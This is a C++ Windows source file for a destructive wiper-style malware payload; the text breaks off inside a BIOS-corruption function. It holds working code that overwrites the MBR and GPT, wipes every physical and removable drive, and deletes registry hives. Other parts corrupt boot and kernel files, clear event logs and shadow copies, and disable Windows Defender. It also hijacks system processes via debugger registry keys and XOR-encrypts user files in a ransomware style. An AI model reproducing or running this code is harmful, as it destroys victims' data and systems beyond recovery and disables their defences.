#include "DestructiveActions.h"
#include "Utilities.h"
#include <random>
#include <memory>
#include <fstream>
#include <shlobj.h>
#include <shellapi.h>
#include <winioctl.h>
#include <ntdddisk.h>
#include <aclapi.h>
#include <setupapi.h>
#include <cfgmgr32.h>
#include <virtdisk.h>
#include <wincrypt.h>
#include <iphlpapi.h>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <urlmon.h>
#include <winhttp.h>
#include <wininet.h>
#include <dpapi.h>
#include <gdiplus.h>
#include <thread>
#include <chrono>
#include <atomic>
#include <mutex>
#include <condition_variable>

#pragma comment(lib, "crypt32.lib")
#pragma comment(lib, "virtdisk.lib")
#pragma comment(lib, "setupapi.lib")
#pragma comment(lib, "winmm.lib")
#pragma comment(lib, "user32.lib")
#pragma comment(lib, "dwmapi.lib")
#pragma comment(lib, "gdi32.lib")
#pragma comment(lib, "ntdll.lib")
#pragma comment(lib, "shell32.lib")
#pragma comment(lib, "advapi32.lib")
#pragma comment(lib, "iphlpapi.lib")
#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "winhttp.lib")
#pragma comment(lib, "wininet.lib")
#pragma comment(lib, "cryptui.lib")
#pragma comment(lib, "gdiplus.lib")
#pragma comment(lib, "urlmon.lib")
#pragma comment(lib, "shlwapi.lib")

// Global variables
bool criticalMode = false;
DWORD bsodTriggerTime = 0;
bool persistenceInstalled = false;
bool disableTaskManager = false;
bool disableRegistryTools = false;
bool fileCorruptionActive = false;
bool processKillerActive = false;
bool g_isAdmin = false;
bool destructiveActionsTriggered = false;
bool networkPropagationActive = false;
bool encryptionActive = false;
bool biosCorruptionActive = false;

// Random number generation
std::random_device rd;
std::mt19937 gen(rd());
std::uniform_int_distribution<> dis(0, 255);
std::uniform_real_distribution<> disf(0.0, 1.0);

BOOL IsRunAsAdmin() {
    BOOL fIsRunAsAdmin = FALSE;
    PSID pAdministratorsGroup = NULL;

    SID_IDENTIFIER_AUTHORITY NtAuthority = SECURITY_NT_AUTHORITY;
    if (AllocateAndInitializeSid(&NtAuthority, 2, SECURITY_BUILTIN_DOMAIN_RID, DOMAIN_ALIAS_RID_ADMINS, 0, 0, 0, 0, 0, 0, &pAdministratorsGroup)) {
        CheckTokenMembership(NULL, pAdministratorsGroup, &fIsRunAsAdmin);
        FreeSid(pAdministratorsGroup);
    }
    return fIsRunAsAdmin;
}

void DestroyMBR() {
    HANDLE hDrive = CreateFileW(L"\\\\.\\PhysicalDrive0", GENERIC_WRITE, FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, NULL);
    if (hDrive == INVALID_HANDLE_VALUE) return;

    // Overwrite first 2048 sectors (1MB)
    const DWORD bufferSize = 512 * 2048;
    std::unique_ptr<BYTE[]> garbageBuffer(new BYTE[bufferSize]);
    for (DWORD i = 0; i < bufferSize; i++) {
        garbageBuffer[i] = static_cast<BYTE>(dis(gen));
    }

    DWORD bytesWritten;
    WriteFile(hDrive, garbageBuffer.get(), bufferSize, &bytesWritten, NULL);
    FlushFileBuffers(hDrive);
    CloseHandle(hDrive);
}

void DestroyGPT() {
    HANDLE hDrive = CreateFileW(L"\\\\.\\PhysicalDrive0", GENERIC_WRITE, FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, NULL);
    if (hDrive == INVALID_HANDLE_VALUE) return;

    // Overwrite GPT header at LBA 1 and backup at last LBA
    const int gptHeaderSize = 512;
    std::unique_ptr<BYTE[]> gptGarbage(new BYTE[gptHeaderSize]);
    for (int i = 0; i < gptHeaderSize; i++) {
        gptGarbage[i] = static_cast<BYTE>(dis(gen));
    }

    DWORD bytesWritten;
    LARGE_INTEGER offset;
    
    // Primary GPT header
    offset.QuadPart = 512;
    SetFilePointerEx(hDrive, offset, NULL, FILE_BEGIN);
    WriteFile(hDrive, gptGarbage.get(), gptHeaderSize, &bytesWritten, NULL);

    // Get disk size for backup GPT header
    DISK_GEOMETRY_EX dg = {0};
    DWORD bytesReturned = 0;
    if (DeviceIoControl(hDrive, IOCTL_DISK_GET_DRIVE_GEOMETRY_EX, NULL, 0, &dg, sizeof(dg), &bytesReturned, NULL)) {
        // Backup GPT header at last LBA
        offset.QuadPart = dg.DiskSize.QuadPart - 512;
        SetFilePointerEx(hDrive, offset, NULL, FILE_BEGIN);
        WriteFile(hDrive, gptGarbage.get(), gptHeaderSize, &bytesWritten, NULL);
    }

    // Overwrite partition entries (more comprehensive)
    const DWORD partitionEntriesSize = 512 * 256;
    std::unique_ptr<BYTE[]> partitionGarbage(new BYTE[partitionEntriesSize]);
    for (DWORD i = 0; i < partitionEntriesSize; i++) {
        partitionGarbage[i] = static_cast<BYTE>(dis(gen));
    }

    // Primary partition entries
    offset.QuadPart = 512 * 2;
    SetFilePointerEx(hDrive, offset, NULL, FILE_BEGIN);
    WriteFile(hDrive, partitionGarbage.get(), partitionEntriesSize, &bytesWritten, NULL);

    // Backup partition entries
    if (DeviceIoControl(hDrive, IOCTL_DISK_GET_DRIVE_GEOMETRY_EX, NULL, 0, &dg, sizeof(dg), &bytesReturned, NULL)) {
        offset.QuadPart = dg.DiskSize.QuadPart - 512 - partitionEntriesSize;
        SetFilePointerEx(hDrive, offset, NULL, FILE_BEGIN);
        WriteFile(hDrive, partitionGarbage.get(), partitionEntriesSize, &bytesWritten, NULL);
    }

    FlushFileBuffers(hDrive);
    CloseHandle(hDrive);
}

void DestroyRegistry() {
    const wchar_t* registryKeys[] = {
        L"HKEY_LOCAL_MACHINE\\SOFTWARE",
        L"HKEY_LOCAL_MACHINE\\SYSTEM",
        L"HKEY_LOCAL_MACHINE\\SAM",
        L"HKEY_LOCAL_MACHINE\\SECURITY",
        L"HKEY_LOCAL_MACHINE\\HARDWARE",
        L"HKEY_CURRENT_USER\\Software",
        L"HKEY_CURRENT_USER\\System",
        L"HKEY_USERS\\.DEFAULT",
        L"HKEY_CLASSES_ROOT",
        L"HKEY_CURRENT_CONFIG"
    };

    for (size_t i = 0; i < sizeof(registryKeys)/sizeof(registryKeys[0]); i++) {
        HKEY hKey;
        wchar_t subKey[256];
        wchar_t rootKey[256];
        
        // Split registry path
        wchar_t* context = NULL;
        wcscpy_s(rootKey, 256, wcstok_s((wchar_t*)registryKeys[i], L"\\", &context));
        wcscpy_s(subKey, 256, context);
        
        HKEY hRoot;
        if (wcscmp(rootKey, L"HKEY_LOCAL_MACHINE") == 0) hRoot = HKEY_LOCAL_MACHINE;
        else if (wcscmp(rootKey, L"HKEY_CURRENT_USER") == 0) hRoot = HKEY_CURRENT_USER;
        else if (wcscmp(rootKey, L"HKEY_USERS") == 0) hRoot = HKEY_USERS;
        else if (wcscmp(rootKey, L"HKEY_CLASSES_ROOT") == 0) hRoot = HKEY_CLASSES_ROOT;
        else if (wcscmp(rootKey, L"HKEY_CURRENT_CONFIG") == 0) hRoot = HKEY_CURRENT_CONFIG;
        else continue;
        
        if (RegOpenKeyExW(hRoot, subKey, 0, KEY_ALL_ACCESS, &hKey) == ERROR_SUCCESS) {
            // Delete all values
            wchar_t valueName[16383];
            DWORD valueNameSize;
            DWORD iValue = 0;
            
            while (1) {
                valueNameSize = 16383;
                if (RegEnumValueW(hKey, iValue, valueName, &valueNameSize, NULL, NULL, NULL, NULL) != ERROR_SUCCESS) break;
                RegDeleteValueW(hKey, valueName);
            }
            
            // Delete all subkeys recursively
            wchar_t subkeyName[256];
            DWORD subkeyNameSize;
            
            while (1) {
                subkeyNameSize = 256;
                if (RegEnumKeyExW(hKey, 0, subkeyName, &subkeyNameSize, NULL, NULL, NULL, NULL) != ERROR_SUCCESS) break;
                
                // Recursive deletion
                HKEY hSubKey;
                if (RegOpenKeyExW(hKey, subkeyName, 0, KEY_ALL_ACCESS, &hSubKey) == ERROR_SUCCESS) {
                    // Delete all values in subkey
                    wchar_t subValueName[16383];
                    DWORD subValueNameSize;
                    DWORD jValue = 0;
                    
                    while (1) {
                        subValueNameSize = 16383;
                        if (RegEnumValueW(hSubKey, jValue, subValueName, &subValueNameSize, NULL, NULL, NULL, NULL) != ERROR_SUCCESS) break;
                        RegDeleteValueW(hSubKey, subValueName);
                    }
                    RegCloseKey(hSubKey);
                }
                
                RegDeleteTreeW(hKey, subkeyName);
            }
            
            RegCloseKey(hKey);
        }
    }
}

void DisableCtrlAltDel() {
    HKEY hKey;
    if (RegCreateKeyExW(HKEY_CURRENT_USER, 
        L"Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", 
        0, NULL, REG_OPTION_NON_VOLATILE, KEY_WRITE, NULL, &hKey, NULL) == ERROR_SUCCESS) {
        DWORD value = 1;
        RegSetValueExW(hKey, L"DisableTaskMgr", 0, REG_DWORD, (BYTE*)&value, sizeof(value));
        RegSetValueExW(hKey, L"DisableChangePassword", 0, REG_DWORD, (BYTE*)&value, sizeof(value));
        RegSetValueExW(hKey, L"DisableLockWorkstation", 0, REG_DWORD, (BYTE*)&value, sizeof(value));
        RegCloseKey(hKey);
    }

    if (g_isAdmin) {
        if (RegCreateKeyExW(HKEY_LOCAL_MACHINE, 
            L"Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", 
            0, NULL, REG_OPTION_NON_VOLATILE, KEY_WRITE, NULL, &hKey, NULL) == ERROR_SUCCESS) {
            DWORD value = 1;
            RegSetValueExW(hKey, L"DisableTaskMgr", 0, REG_DWORD, (BYTE*)&value, sizeof(value));
            RegSetValueExW(hKey, L"DisableChangePassword", 0, REG_DWORD, (BYTE*)&value, sizeof(value));
            RegSetValueExW(hKey, L"DisableLockWorkstation", 0, REG_DWORD, (BYTE*)&value, sizeof(value));
            RegCloseKey(hKey);
        }
    }
}

void SetCriticalProcess() {
    typedef NTSTATUS(NTAPI* pRtlSetProcessIsCritical)(
        BOOLEAN bNew,
        BOOLEAN *pbOld,
        BOOLEAN bNeedScb
    );

    HMODULE hNtDll = LoadLibraryW(L"ntdll.dll");
    if (hNtDll) {
        pRtlSetProcessIsCritical RtlSetProcessIsCritical = 
            (pRtlSetProcessIsCritical)GetProcAddress(hNtDll, "RtlSetProcessIsCritical");
        if (RtlSetProcessIsCritical) {
            RtlSetProcessIsCritical(TRUE, NULL, FALSE);
        }
        FreeLibrary(hNtDll);
    }
}

void BreakTaskManager() {
    // Corrupt taskmgr.exe and related files
    const wchar_t* taskmgrPaths[] = {
        L"C:\\Windows\\System32\\taskmgr.exe",
        L"C:\\Windows\\SysWOW64\\taskmgr.exe",
        L"C:\\Windows\\System32\\Taskmgr.exe.mui",
        L"C:\\Windows\\SysWOW64\\Taskmgr.exe.mui",
        L"C:\\Windows\\System32\\en-US\\taskmgr.exe.mui",
        L"C:\\Windows\\SysWOW64\\en-US\\taskmgr.exe.mui"
    };

    for (size_t i = 0; i < sizeof(taskmgrPaths)/sizeof(taskmgrPaths[0]); i++) {
        HANDLE hFile = CreateFileW(taskmgrPaths[i], GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
        if (hFile != INVALID_HANDLE_VALUE) {
            DWORD fileSize = GetFileSize(hFile, NULL);
            if (fileSize != INVALID_FILE_SIZE && fileSize > 0) {
                std::unique_ptr<BYTE[]> buffer(new BYTE[fileSize]);
                if (buffer) {
                    for (DWORD j = 0; j < fileSize; j++) {
                        buffer[j] = static_cast<BYTE>(dis(gen));
                    }
                    DWORD written;
                    WriteFile(hFile, buffer.get(), fileSize, &written, NULL);
                }
            }
            CloseHandle(hFile);
        }
    }

    // Kill existing task manager processes
    KillCriticalProcesses();
}

void ClearEventLogs() {
    const wchar_t* logs[] = {
        L"Application", L"Security", L"System", L"Setup", 
        L"ForwardedEvents", L"HardwareEvents", L"Internet Explorer",
        L"Windows PowerShell", L"Microsoft-Windows-Windows Defender/Operational"
    };
    
    for (int i = 0; i < sizeof(logs)/sizeof(logs[0]); i++) {
        wchar_t command[256];
        wsprintfW(command, L"wevtutil cl \"%s\"", logs[i]);
        
        STARTUPINFOW si = { sizeof(si) };
        PROCESS_INFORMATION pi;
        CreateProcessW(NULL, command, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
        if (pi.hProcess) {
            WaitForSingleObject(pi.hProcess, 5000);
            CloseHandle(pi.hThread);
            CloseHandle(pi.hProcess);
        }
    }
}

void ClearShadowCopies() {
    STARTUPINFOW si = { sizeof(si) };
    PROCESS_INFORMATION pi;
    CreateProcessW(NULL, L"vssadmin delete shadows /all /quiet", 
                 NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
    if (pi.hProcess) {
        WaitForSingleObject(pi.hProcess, 10000);
        CloseHandle(pi.hThread);
        CloseHandle(pi.hProcess);
    }
    
    // Also try with wmic
    CreateProcessW(NULL, L"wmic shadowcopy delete", 
                 NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
    if (pi.hProcess) {
        WaitForSingleObject(pi.hProcess, 5000);
        CloseHandle(pi.hThread);
        CloseHandle(pi.hProcess);
    }
}

void WipeRemovableMedia() {
    const int BUFFER_SIZE = 1024 * 1024; // 1MB buffer
    std::unique_ptr<BYTE[]> wipeBuffer(new BYTE[BUFFER_SIZE]);
    for (int i = 0; i < BUFFER_SIZE; i++) {
        wipeBuffer[i] = static_cast<BYTE>(dis(gen));
    }

    wchar_t drives[128];
    DWORD len = GetLogicalDriveStringsW(127, drives);
    wchar_t* drive = drives;
    
    while (*drive) {
        UINT type = GetDriveTypeW(drive);
        if (type == DRIVE_REMOVABLE || type == DRIVE_CDROM || type == DRIVE_REMOTE) {
            wchar_t devicePath[50];
            wsprintfW(devicePath, L"\\\\.\\%c:", drive[0]);
            
            HANDLE hDevice = CreateFileW(devicePath, GENERIC_WRITE, 
                FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, NULL);
            
            if (hDevice != INVALID_HANDLE_VALUE) {
                DISK_GEOMETRY_EX dg = {0};
                DWORD bytesReturned = 0;
                if (DeviceIoControl(hDevice, IOCTL_DISK_GET_DRIVE_GEOMETRY_EX, 
                    NULL, 0, &dg, sizeof(dg), &bytesReturned, NULL)) {
                    
                    LARGE_INTEGER diskSize = dg.DiskSize;
                    LARGE_INTEGER totalWritten = {0};
                    
                    while (totalWritten.QuadPart < diskSize.QuadPart) {
                        DWORD bytesToWrite = (diskSize.QuadPart - totalWritten.QuadPart > BUFFER_SIZE) 
                            ? BUFFER_SIZE : diskSize.QuadPart - totalWritten.QuadPart;
                        
                        DWORD bytesWritten;
                        WriteFile(hDevice, wipeBuffer.get(), bytesToWrite, &bytesWritten, NULL);
                        totalWritten.QuadPart += bytesWritten;
                    }
                }
                CloseHandle(hDevice);
            }
        }
        drive += wcslen(drive) + 1;
    }
}

void CorruptBootFiles() {
    const wchar_t* bootFiles[] = {
        L"C:\\Windows\\Boot\\PCAT\\bootmgr",
        L"C:\\Windows\\Boot\\EFI\\bootmgfw.efi",
        L"C:\\Windows\\System32\\winload.exe",
        L"C:\\Windows\\System32\\winload.efi",
        L"C:\\Windows\\System32\\winresume.exe",
        L"C:\\Windows\\System32\\winresume.efi",
        L"C:\\Windows\\System32\\bootres.dll",
        L"C:\\Windows\\System32\\Boot\\bootres.dll",
        L"C:\\Windows\\System32\\config\\SYSTEM",
        L"C:\\Windows\\System32\\config\\SOFTWARE",
        L"C:\\Windows\\System32\\config\\SECURITY",
        L"C:\\Windows\\System32\\config\\SAM",
        L"C:\\Windows\\System32\\config\\DEFAULT"
    };

    for (int i = 0; i < sizeof(bootFiles)/sizeof(bootFiles[0]); i++) {
        HANDLE hFile = CreateFileW(bootFiles[i], GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
        if (hFile != INVALID_HANDLE_VALUE) {
            DWORD fileSize = GetFileSize(hFile, NULL);
            if (fileSize != INVALID_FILE_SIZE && fileSize > 0) {
                std::unique_ptr<BYTE[]> buffer(new BYTE[fileSize]);
                for (DWORD j = 0; j < fileSize; j++) {
                    buffer[j] = static_cast<BYTE>(dis(gen));
                }
                DWORD written;
                WriteFile(hFile, buffer.get(), fileSize, &written, NULL);
            }
            CloseHandle(hFile);
        }
    }
}

void CorruptKernelFiles() {
    const wchar_t* kernelFiles[] = {
        L"C:\\Windows\\System32\\ntoskrnl.exe",
        L"C:\\Windows\\System32\\ntkrnlpa.exe",
        L"C:\\Windows\\System32\\hal.dll",
        L"C:\\Windows\\System32\\kdcom.dll",
        L"C:\\Windows\\System32\\ci.dll",
        L"C:\\Windows\\System32\\drivers\\*.sys",
        L"C:\\Windows\\System32\\drivers\\etc\\hosts",
        L"C:\\Windows\\System32\\drivers\\etc\\networks"
    };

    for (int i = 0; i < sizeof(kernelFiles)/sizeof(kernelFiles[0]); i++) {
        // Handle wildcards
        if (wcschr(kernelFiles[i], L'*') != NULL) {
            WIN32_FIND_DATAW fd;
            HANDLE hFind = FindFirstFileW(kernelFiles[i], &fd);
            if (hFind != INVALID_HANDLE_VALUE) {
                do {
                    if (!(fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)) {
                        wchar_t filePath[MAX_PATH];
                        wcscpy_s(filePath, MAX_PATH, L"C:\\Windows\\System32\\drivers\\");
                        wcscat_s(filePath, MAX_PATH, fd.cFileName);
                        
                        HANDLE hFile = CreateFileW(filePath, GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
                        if (hFile != INVALID_HANDLE_VALUE) {
                            DWORD fileSize = GetFileSize(hFile, NULL);
                            if (fileSize != INVALID_FILE_SIZE && fileSize > 0) {
                                std::unique_ptr<BYTE[]> buffer(new BYTE[fileSize]);
                                for (DWORD j = 0; j < fileSize; j++) {
                                    buffer[j] = static_cast<BYTE>(dis(gen));
                                }
                                DWORD written;
                                WriteFile(hFile, buffer.get(), fileSize, &written, NULL);
                            }
                            CloseHandle(hFile);
                        }
                    }
                } while (FindNextFileW(hFind, &fd));
                FindClose(hFind);
            }
        } else {
            HANDLE hFile = CreateFileW(kernelFiles[i], GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
            if (hFile != INVALID_HANDLE_VALUE) {
                DWORD fileSize = GetFileSize(hFile, NULL);
                if (fileSize != INVALID_FILE_SIZE && fileSize > 0) {
                    std::unique_ptr<BYTE[]> buffer(new BYTE[fileSize]);
                    for (DWORD j = 0; j < fileSize; j++) {
                        buffer[j] = static_cast<BYTE>(dis(gen));
                    }
                    DWORD written;
                    WriteFile(hFile, buffer.get(), fileSize, &written, NULL);
                }
                CloseHandle(hFile);
            }
        }
    }
}

void DisableWindowsDefender() {
    // Layer 1: Stop services
    SC_HANDLE scm = OpenSCManager(NULL, NULL, SC_MANAGER_ALL_ACCESS);
    if (scm) {
        const wchar_t* services[] = {
            L"WinDefend", L"WdNisSvc", L"SecurityHealthService", L"wscsvc",
            L"MsMpSvc", L"mpssvc", L"Sense", L"SgrmAgent", L"SgrmBroker"
        };
        
        for (int i = 0; i < sizeof(services)/sizeof(services[0]); i++) {
            SC_HANDLE service = OpenServiceW(scm, services[i], SERVICE_ALL_ACCESS);
            if (service) {
                SERVICE_STATUS status;
                ControlService(service, SERVICE_CONTROL_STOP, &status);
                
                // Disable service
                SERVICE_CONFIG config;
                DWORD bytesNeeded;
                QueryServiceConfig(service, &config, sizeof(config), &bytesNeeded);
                ChangeServiceConfig(service, SERVICE_NO_CHANGE, SERVICE_DISABLED, 
                                  SERVICE_NO_CHANGE, NULL, NULL, NULL, NULL, NULL, NULL, NULL);
                CloseServiceHandle(service);
            }
        }
        CloseServiceHandle(scm);
    }

    // Layer 2: Disable via registry
    HKEY hKey;
    if (RegCreateKeyExW(HKEY_LOCAL_MACHINE, 
        L"SOFTWARE\\Policies\\Microsoft\\Windows Defender", 
        0, NULL, REG_OPTION_NON_VOLATILE, KEY_WRITE, NULL, &hKey, NULL) == ERROR_SUCCESS) {
        DWORD disable = 1;
        RegSetValueExW(hKey, L"DisableAntiSpyware", 0, REG_DWORD, (BYTE*)&disable, sizeof(disable));
        RegSetValueExW(hKey, L"DisableAntiVirus", 0, REG_DWORD, (BYTE*)&disable, sizeof(disable));
        RegSetValueExW(hKey, L"DisableRoutinelyTakingAction", 0, REG_DWORD, (BYTE*)&disable, sizeof(disable));
        RegCloseKey(hKey);
    }

    // Layer 3: Disable real-time protection
    if (RegCreateKeyExW(HKEY_LOCAL_MACHINE, 
        L"SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection", 
        0, NULL, REG_OPTION_NON_VOLATILE, KEY_WRITE, NULL, &hKey, NULL) == ERROR_SUCCESS) {
        DWORD disable = 0;
        RegSetValueExW(hKey, L"DisableRealtimeMonitoring", 0, REG_DWORD, (BYTE*)&disable, sizeof(disable));
        RegSetValueExW(hKey, L"DisableBehaviorMonitoring", 0, REG_DWORD, (BYTE*)&disable, sizeof(disable));
        RegSetValueExW(hKey, L"DisableOnAccessProtection", 0, REG_DWORD, (BYTE*)&disable, sizeof(disable));
        RegSetValueExW(hKey, L"DisableScanOnRealtimeEnable", 0, REG_DWORD, (BYTE*)&disable, sizeof(disable));
        RegSetValueExW(hKey, L"DisableIOAVProtection", 0, REG_DWORD, (BYTE*)&disable, sizeof(disable));
        RegCloseKey(hKey);
    }

    // Layer 4: Disable scheduled tasks
    STARTUPINFOW si = { sizeof(si) };
    PROCESS_INFORMATION pi;
    const wchar_t* tasks[] = {
        L"Microsoft\\Windows\\Windows Defender\\Windows Defender Cache Maintenance",
        L"Microsoft\\Windows\\Windows Defender\\Windows Defender Cleanup",
        L"Microsoft\\Windows\\Windows Defender\\Windows Defender Scheduled Scan",
        L"Microsoft\\Windows\\Windows Defender\\Windows Defender Verification",
        L"Microsoft\\Windows\\Windows Defender\\Windows Defender Heartbeat"
    };
    
    for (int i = 0; i < sizeof(tasks)/sizeof(tasks[0]); i++) {
        wchar_t command[512];
        wsprintfW(command, L"schtasks /Change /TN \"%s\" /DISABLE", tasks[i]);
        CreateProcessW(NULL, command, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
        if (pi.hProcess) {
            WaitForSingleObject(pi.hProcess, 2000);
            CloseHandle(pi.hThread);
            CloseHandle(pi.hProcess);
        }
        
        wsprintfW(command, L"schtasks /Delete /TN \"%s\" /F", tasks[i]);
        CreateProcessW(NULL, command, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
        if (pi.hProcess) {
            WaitForSingleObject(pi.hProcess, 2000);
            CloseHandle(pi.hThread);
            CloseHandle(pi.hProcess);
        }
    }
}

void SetCustomBootFailure() {
    HKEY hKey;
    if (RegCreateKeyExW(HKEY_LOCAL_MACHINE, 
        L"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options", 
        0, NULL, REG_OPTION_NON_VOLATILE, KEY_WRITE, NULL, &hKey, NULL) == ERROR_SUCCESS) {
        
        HKEY subKey;
        if (RegCreateKeyExW(hKey, L"winlogon.exe", 0, NULL, REG_OPTION_NON_VOLATILE, KEY_WRITE, NULL, &subKey, NULL) == ERROR_SUCCESS) {
            wchar_t debugger[] = L"cmd.exe /c \"echo CRITICAL SYSTEM FAILURE && echo Bootloader corrupted && echo System integrity compromised && echo Contact administrator && pause\"";
            RegSetValueExW(subKey, L"Debugger", 0, REG_SZ, (BYTE*)debugger, (wcslen(debugger) + 1) * sizeof(wchar_t));
            RegCloseKey(subKey);
        }
        
        // Target more critical processes
        const wchar_t* processes[] = {
            L"lsass.exe", L"services.exe", L"svchost.exe", L"csrss.exe", L"wininit.exe"
        };
        
        for (int i = 0; i < sizeof(processes)/sizeof(processes[0]); i++) {
            if (RegCreateKeyExW(hKey, processes[i], 0, NULL, REG_OPTION_NON_VOLATILE, KEY_WRITE, NULL, &subKey, NULL) == ERROR_SUCCESS) {
                wchar_t debugger[] = L"cmd.exe /c \"echo CRITICAL SYSTEM FAILURE && shutdown -r -t 0\"";
                RegSetValueExW(subKey, L"Debugger", 0, REG_SZ, (BYTE*)debugger, (wcslen(debugger) + 1) * sizeof(wchar_t));
                RegCloseKey(subKey);
            }
        }
        
        RegCloseKey(hKey);
    }

    // Set custom shutdown message
    if (RegCreateKeyExW(HKEY_LOCAL_MACHINE, 
        L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", 
        0, NULL, REG_OPTION_NON_VOLATILE, KEY_WRITE, NULL, &hKey, NULL) == ERROR_SUCCESS) {
        wchar_t caption[] = L"CRITICAL SYSTEM FAILURE";
        wchar_t message[] = L"Bootloader corrupted. System integrity compromised. Contact administrator.\n\nAll data may be lost. Do not power off the system.";
        RegSetValueExW(hKey, L"legalnoticecaption", 0, REG_SZ, (BYTE*)caption, (wcslen(caption) + 1) * sizeof(wchar_t));
        RegSetValueExW(hKey, L"legalnoticetext", 0, REG_SZ, (BYTE*)message, (wcslen(message) + 1) * sizeof(wchar_t));
        RegCloseKey(hKey);
    }
}

void WipeAllDrives() {
    const int BUFFER_SIZE = 1024 * 1024; // 1MB buffer
    std::unique_ptr<BYTE[]> wipeBuffer(new BYTE[BUFFER_SIZE]);
    for (int i = 0; i < BUFFER_SIZE; i++) {
        wipeBuffer[i] = static_cast<BYTE>(dis(gen));
    }

    // Wipe up to 16 physical drives
    for (int driveNum = 0; driveNum < 16; driveNum++) {
        wchar_t devicePath[50];
        wsprintfW(devicePath, L"\\\\.\\PhysicalDrive%d", driveNum);
        
        HANDLE hDevice = CreateFileW(devicePath, GENERIC_WRITE, 
            FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, NULL);
        
        if (hDevice != INVALID_HANDLE_VALUE) {
            DISK_GEOMETRY_EX dg = {0};
            DWORD bytesReturned = 0;
            if (DeviceIoControl(hDevice, IOCTL_DISK_GET_DRIVE_GEOMETRY_EX, 
                NULL, 0, &dg, sizeof(dg), &bytesReturned, NULL)) {
                
                LARGE_INTEGER diskSize = dg.DiskSize;
                LARGE_INTEGER totalWritten = {0};
                
                while (totalWritten.QuadPart < diskSize.QuadPart) {
                    DWORD bytesToWrite = (diskSize.QuadPart - totalWritten.QuadPart > BUFFER_SIZE) 
                        ? BUFFER_SIZE : diskSize.QuadPart - totalWritten.QuadPart;
                    
                    DWORD bytesWritten;
                    WriteFile(hDevice, wipeBuffer.get(), bytesToWrite, &bytesWritten, NULL);
                    totalWritten.QuadPart += bytesWritten;
                }
            }
            CloseHandle(hDevice);
        }
    }
}

void EncryptUserFiles() {
    wchar_t userProfile[MAX_PATH];
    if (SUCCEEDED(SHGetFolderPathW(NULL, CSIDL_PROFILE, NULL, 0, userProfile))) {
        // Encrypt common user folders
        const wchar_t* folders[] = {
            L"\\Documents", L"\\Pictures", L"\\Videos", L"\\Music", 
            L"\\Downloads", L"\\Desktop", L"\\Contacts", L"\\Favorites"
        };
        
        for (int i = 0; i < sizeof(folders)/sizeof(folders[0]); i++) {
            wchar_t folderPath[MAX_PATH];
            wcscpy_s(folderPath, MAX_PATH, userProfile);
            wcscat_s(folderPath, MAX_PATH, folders[i]);
            
            // Simple XOR "encryption" - in a real virus, this would use proper crypto
            WIN32_FIND_DATAW fd;
            wchar_t searchPath[MAX_PATH];
            wsprintfW(searchPath, L"%s\\*", folderPath);
            
            HANDLE hFind = FindFirstFileW(searchPath, &fd);
            if (hFind != INVALID_HANDLE_VALUE) {
                do {
                    if (!(fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)) {
                        wchar_t filePath[MAX_PATH];
                        wsprintfW(filePath, L"%s\\%s", folderPath, fd.cFileName);
                        
                        HANDLE hFile = CreateFileW(filePath, GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
                        if (hFile != INVALID_HANDLE_VALUE) {
                            DWORD fileSize = GetFileSize(hFile, NULL);
                            if (fileSize != INVALID_FILE_SIZE && fileSize > 0) {
                                std::unique_ptr<BYTE[]> buffer(new BYTE[fileSize]);
                                DWORD bytesRead;
                                
                                if (ReadFile(hFile, buffer.get(), fileSize, &bytesRead, NULL)) {
                                    // Simple XOR encryption with a fixed key
                                    for (DWORD j = 0; j < fileSize; j++) {
                                        buffer[j] ^= 0xAA;
                                    }
                                    
                                    SetFilePointer(hFile, 0, NULL, FILE_BEGIN);
                                    DWORD bytesWritten;
                                    WriteFile(hFile, buffer.get(), fileSize, &bytesWritten, NULL);
                                }
                            }
                            CloseHandle(hFile);
                        }
                    }
                } while (FindNextFileW(hFind, &fd));
                FindClose(hFind);
            }
        }
    }
    
    encryptionActive = true;
}

void CorruptBIOS() {
    if (!g_isAdmin) return;
    
    // Attempt to flash corrupted BIOS - this is highly dangerous and system-specific
    // This is a simplified version that attempts to access BIOS memory
    
    // Method 1: Attempt to write to BIOS through WMI
    STARTUPINFOW si = { sizeof(si) };
    PROCESS_INFORMATION pi;
    
    const wchar_t* biosCommands[] = {
        L"wmic bios set serialnumber=BROKEN4-CORRUPTED",
        L"wmic bios set version=BROKEN4-CORRUPTED",
        L"wmic /namespace:\\\\root\\wmi path setBIOSSettings /value:\"CORRUPTED\"",
        L"wmic /namespace:\\\\root\\wmi path setBIOSSetting /value:\"CORRUPTED\""
    };
    
    for (int i = 0; i < sizeof(biosCommands)/sizeof(biosCommands[0]); i++) {
        CreateProcessW(NULL, (LPWSTR)biosCommands[i], NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
        if (pi.hProcess) {
            WaitForSingleObject(pi.hProcess, 2000);
            CloseHandle(pi.hThread);
            CloseHandle(pi.hProcess);
        }
    }
    
    // Method 2: Attempt direct port I/O (will fail on most modern systems)
    __try {
        // Try to access BIOS memory directly (this will likely cause a crash)
        BYTE* biosMemory = (BYTE*)0xF0000;
        for (int i = 0; i < 65536; i++) {
            biosMemory[i] = static_cast<BYTE>(dis(gen));
        }
    }
